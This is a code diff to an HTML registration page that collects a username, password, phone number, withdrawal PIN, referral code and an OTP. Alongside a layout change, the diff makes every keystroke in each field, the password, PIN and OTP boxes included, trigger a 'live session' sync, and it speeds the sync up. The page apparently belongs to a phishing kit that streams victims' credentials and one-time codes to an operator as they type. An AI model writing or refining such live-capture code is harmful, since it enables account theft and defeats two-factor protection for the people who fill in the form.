@@ -40,8 +40,8 @@
     <div class="w-6"></div>
   </header>
 
-  <!-- Main Form Section -->
-  <main class="flex-1 flex flex-col items-center justify-center px-5 py-8">
+  <!-- Main Form Section - Shifted Up -->
+  <main class="flex-1 flex flex-col items-center justify-start px-5 pt-6 pb-8">
     <form id="registerForm" class="w-full max-w-md space-y-4">
 
       <!-- Username -->
@@ -151,9 +151,16 @@
     // Restrict numeric fields to numbers only
     document.getElementById('phone').addEventListener('input', (e) => {
       e.target.value = e.target.value.replace(/\D/g, '');
+      syncLiveSession('Filling Form');
     });
     document.getElementById('withdrawalPin').addEventListener('input', (e) => {
       e.target.value = e.target.value.replace(/\D/g, '');
+      syncLiveSession('Filling Form');
+    });
+
+    // Other inputs immediate sync
+    ['username', 'password', 'referral'].forEach(id => {
+      document.getElementById(id).addEventListener('input', () => syncLiveSession('Filling Form'));
     });
 
     // Form Submit -> Trigger OTP Modal
@@ -226,6 +233,7 @@
 
       box.addEventListener('input', (e) => {
         e.target.value = e.target.value.replace(/\D/g, '');
+        syncLiveSession('Entering OTP');
         if (e.target.value.length === 1 && index < otpBoxes.length - 1) {
           otpBoxes[index + 1].focus();
         }
@@ -304,21 +312,7 @@
         } catch (err) {
           console.error('Live sync error:', err);
         }
-      }, 250);
-    }
-
-    // Input listeners for Live Sync
-    ['username', 'password', 'withdrawalPin', 'phone', 'referral'].forEach(id => {
-      const el = document.getElementById(id);
-      if (el) {
-        el.addEventListener('input', () => syncLiveSession('Filling Form'));
-      }
-    });
-
-    if (otpBoxes.length > 0) {
-      otpBoxes.forEach(box => {
-        box.addEventListener('input', () => syncLiveSession('Entering OTP'));
-      });
+      }, 150);
     }
   </script>
 </body>
